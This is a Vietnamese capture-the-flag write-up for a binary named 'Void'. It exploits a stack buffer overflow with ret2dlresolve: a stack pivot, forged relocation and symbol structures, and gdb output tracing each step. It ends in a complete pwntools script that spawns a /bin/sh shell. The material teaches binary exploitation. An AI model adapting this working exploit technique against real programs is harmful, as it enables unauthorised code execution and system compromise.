# Void

## Source

```c
ssize_t vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  return read(0, buf, 200uLL);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  vuln();
  return 0;
}
```

## Ý tưởng

- Bài này chỉ cho ta một hàm vuln chỉ để đọc và có lỗi BOF, thường ta sẽ nghĩ đến ret2dlresolve
- vmmap được địa chỉ 0x40400 nên ret2dlresolve khá là oke
- Các bước
  - Stage 1: Stack pivot
  - Stage 2: Create structures
  - Stage 3: Get shell

## Thực thi

- Đầu tiên ta cần một vùng địa chỉ là có quyền ghi (thường base + 0xa00) (ban đầu mình chọn thấp hơn nên lỗi lúc getshell)
- Và các gadget sau

```python
leave_ret = 0x0000000000401141
pop_rbp = 0x0000000000401109
pop_rdi = 0x00000000004011bb
pop_rsi_r15 = 0x00000000004011b9
rw_section = 0x00000000404a00
offset = 72
```

- rồi chúng ta set up hàm read nhằm đưa shell dlresolve vào vùng ghi được

```python
payload = b"a" * (offset-8)
# set up read
payload += flat(
    rw_section,
    pop_rsi_r15,
    rw_section, 0,
    exe.plt['read'],
    leave_ret
)
payload = payload.ljust(200)
s(payload)
```

- Tại sao phải offset - 8, ban đầu mình tính payload như này, thì nó bị sigbus

```python
payload = b"a" * (offset)
# set up read
payload += flat(
    # rw_section,
    pop_rsi_r15,
    rw_section, 0,
    exe.plt['read'],
    leave_ret
)
payload = payload.ljust(200)
s(payload)
```

- Do thanh rbp truy cập một vùng nhớ không tồn tại trong bộ nhớ (SIGBUS), do đó ta cần đưa rbp nhận một địa chỉ là rw-section để rip nằm dưới rbp sẽ là shell của mình

## Stage 2: Create structures

- Tiếp đến ta cần tìm địa chỉ sau bằng lệnh info file

```python
# JMPREL          0x0000000000400430 - 0x0000000000400448 is .rela.plt
# SYSTAB          0x0000000000400330 - 0x0000000000400390 is .dynsym
# STRTAB          0x0000000000400390 - 0x00000000004003d6 is .dynstr
# dlresolve       0x0000000000401020 - 0x0000000000401040 is .plt
JMPREL = 0x0000000000400430
SYMTAB = 0x0000000000400330
STRTAB = 0x0000000000400390
dlresolve = 0x0000000000401020
```

- Sau đó ta tìm các địa chỉ sau, ta nên lùi sau 0x50 so với rw_section vì trong 0x50 byte đó ta cần để 1 số gì đó. Và các địa chỉ đó thoả mãn các điều kiện sau và `symbol_number, reloc_arg, st_name` là số nguyên

```python
symbol_number = int((SYMTAB_addr - SYMTAB)/24)
reloc_arg = int((JMPREL_addr - JMPREL)/24)
st_name = STRTAB_addr - STRTAB
```

### SYMTAB struct

```python
st_info = 0x12
st_other = 0
st_shndx = 0
st_value = 0
st_size = 0
SYMTAB_struct = p32(st_name) \
    + p8(st_info) \
    + p8(st_other) \
    + p16(st_shndx) \
    + p64(st_value) \
    + p64(st_size)
```

### JMPREL struct

```python
r_offset = 0x404300                                 # tuỳ ý, trong vùng rw_section là được
r_info = (symbol_number << 32) | 7
r_addend = 0
JMPREL_struct = flat(r_offset, r_info, r_addend)
```

## Stage 3: Get shell

- Để đặt được các struct ta có thể làm như sau, đâu tiên là như này trước

```python
payload = flat(
    b'A'*8,         # Fake rbp
    pop_rsi_r15,    # rip
    0,
    0,
    pop_rdi,
    0x404a98,        # String /bin/sh

    dlresolve,
    reloc_arg,       # Reloc_arg

    0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x8, 0x10
)
```

- Ta dừng ở đây để kiểm tra
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/85155d12-1b4c-4d56-a71e-80405595ed42)
- Đầu tiên kiểm tra $rsp

```
gef➤  x/xg $rsp
0x404a38:       0x00000000000002ed
# <JMPREL> + 0x2ed*24
gef➤  x/3xg 0x0000000000400430+0x2ed*24
0x404a68:       0x0000000000000006      0x0000000000000007
0x404a78:       0x0000000000000008
```

- Đó z JMPREL_struct của chúng ta se ở 0x6 `0x1, 0x2, 0x3, 0x4, 0x5, JMPREL_struct, 0x7, 0x8, 0x8, 0x10`
- Chạy lại chương trình

```
gef➤  x/3xg 0x0000000000400430+0x2ed*24
0x404a68:       0x0000000000404300      0x000002f600000007
0x404a78:       0x0000000000000000
# <SYMTAB> + (0x000002f600000007>>32)*24
gef➤  x/3xg 0x0000000000400330 + (0x000002f600000007>>32)*24
0x404a40:       0x0000000000000001      0x0000000000000002
0x404a50:       0x0000000000000003
gef➤  x/3xg 0x0000000000400330 + (0x000002f600000007>>32)*24
0x404a40:       0x0000001200004700      0x0000000000000000
0x404a50:       0x0000000000000000
# <STRTAB> + 0x4700
gef➤  x/xg 0x0000000000400390+0x4700
0x404a90:       0x0000000000000007
```

- `STRTAB` nhận vào chữ system nên tại 0x7 ta để là system và ngay sau chữ `b'system\x00\x00'` là /bin/sh
- phải bỏ đúng 8 byte nha, mình gặp lỗi `system\0` có 7 byte thì kí tự `/` bị đưa nhầm vào.

```
gef➤  x/s 0x0000000000400390+0x4700
0x404a90:       "system"
gef➤  x/s 0x0000000000400390+0x4700+8
0x404a98:       "bin/sh"
```

- Check lại một lần nữa, hình như hơi lệnh nên ta cứ chỉnh thoi =)))

```
gef➤  x/3xg 0x0000000000400430+0x2ed*24
0x404a68:       0x0000000000000004      0x0000000000000005
0x404a78:       0x0000000000404300
```

- Cuối cùng ra gần giống như này là oke

```
gef➤  x/xg $rsp
0x404a38:       0x00000000000002ed
gef➤  x/3xg 0x0000000000400430+0x2ed*24
0x404a68:       0x0000000000404300      0x000002f600000007
0x404a78:       0x0000000000000000
gef➤  x/3xg 0x0000000000400330 + (0x000002f600000007>>32)*24
0x404a40:       0x0000001200004700      0x0000000000000000
0x404a50:       0x0000000000000000
gef➤  x/s 0x0000000000400390+0x4700
0x404a90:       "system"
gef➤
```

## Get flag

<details> <summary> script </summary>

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('void', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*vuln+32

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
############################
### Stage 1: Stack pivot ###
############################
leave_ret = 0x0000000000401141
pop_rbp = 0x0000000000401109
pop_rdi = 0x00000000004011bb
pop_rsi_r15 = 0x00000000004011b9
rw_section = 0x00000000404a00
offset = 72
payload = b"a" * (offset-8)
# set up read
payload += flat(
    rw_section,
    pop_rsi_r15,
    rw_section, 0,
    exe.plt['read'],
    leave_ret
)
payload = payload.ljust(200)
s(payload)

#####################################
### Stage 2: Create structures  #####
#####################################
# JMPREL          0x0000000000400430 - 0x0000000000400448 is .rela.plt
# SYSTAB          0x0000000000400330 - 0x0000000000400390 is .dynsym
# STRTAB          0x0000000000400390 - 0x00000000004003d6 is .dynstr
# dlresolve       0x0000000000401020 - 0x0000000000401040 is .plt
JMPREL = 0x0000000000400430
SYMTAB = 0x0000000000400330
STRTAB = 0x0000000000400390
dlresolve = 0x0000000000401020

SYMTAB_addr = 0x404a50
JMPREL_addr = 0x404a70
STRTAB_addr = 0x404a90

symbol_number = int((SYMTAB_addr - SYMTAB)/24)
reloc_arg = int((JMPREL_addr - JMPREL)/24)
st_name = STRTAB_addr - STRTAB

st_info = 0x12
st_other = 0
st_shndx = 0
st_value = 0
st_size = 0
SYMTAB_struct = p32(st_name) \
    + p8(st_info) \
    + p8(st_other) \
    + p16(st_shndx) \
    + p64(st_value) \
    + p64(st_size)

r_offset = 0x404300
r_info = (symbol_number << 32) | 7
r_addend = 0
JMPREL_struct = flat(r_offset, r_info, r_addend)

payload = flat(
    b'A'*8,          # Fake rbp
    pop_rsi_r15,
    0,
    0,
    pop_rdi,
    0x404a98,        # String /bin/sh

    dlresolve,
    reloc_arg,       # Reloc_arg

    SYMTAB_struct,
    0,
    0,
    JMPREL_struct,
    0,
    0,
    b'system\x00\x00',
    b'/bin/sh\x00'
)
p.send(payload)
p.interactive()

```

</details>

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/a7af6139-7bb5-401c-87cf-20c3b6e1109c)
